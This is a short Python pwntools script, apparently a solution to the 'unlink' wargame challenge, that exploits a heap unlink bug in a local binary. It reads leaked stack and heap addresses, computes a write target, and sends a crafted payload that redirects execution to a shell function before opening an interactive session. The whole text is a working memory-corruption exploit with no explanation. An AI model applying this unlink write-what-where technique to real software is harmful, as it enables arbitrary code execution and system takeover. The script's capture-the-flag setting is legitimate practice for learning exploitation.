from pwn import *

p = process('./unlink')

p.recvuntil('stack address leak: ')
stack_addr = int(p.recvline()[2:], 16)
log.success('stack: {:#x}'.format(stack_addr))

p.recvuntil('heap address leak: ')
heap_addr = int(p.recvline()[2:], 16)
log.success('heap: {:#x}'.format(heap_addr))

p.recvline()

# gap between chunks: 0x18

target_addr = stack_addr + 0x10
target_value = heap_addr + 8 + 4
shell_addr = 0x080484eb

p.send(p32(shell_addr) + 'a'*12 + p32(target_value) + p32(target_addr))
p.interactive()
